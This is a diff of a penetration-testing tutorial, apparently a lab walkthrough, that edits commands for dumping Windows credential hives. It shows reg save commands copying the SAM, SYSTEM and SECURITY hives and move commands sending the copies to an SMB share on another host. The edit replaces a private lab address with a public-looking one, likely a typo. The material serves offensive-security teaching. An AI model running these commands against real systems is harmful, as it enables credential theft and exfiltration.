@@ -64,11 +64,11 @@ C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
 
 The operation completed successfully.
 
-C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
+C:\WINDOWS\system32> reg save hklm\system C:\system.save
 
 The operation completed successfully.
 
-C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
+C:\WINDOWS\system32> reg save hklm\security C:\security.save
 
 The operation completed successfully.
 ```
@@ -94,13 +94,13 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 #### Moving Hive Copies to Share
 
 ```cmd-session
-C:\> move sam.save \\10.10.15.16\CompData
+C:\> move sam.save \\110.10.14.159\regfile
         1 file(s) moved.
 
-C:\> move security.save \\10.10.15.16\CompData
+C:\> move security.save \\110.10.14.159\regfile
         1 file(s) moved.
 
-C:\> move system.save \\10.10.15.16\CompData
+C:\> move system.save \\110.10.14.159\regfile
         1 file(s) moved.
 ```
 
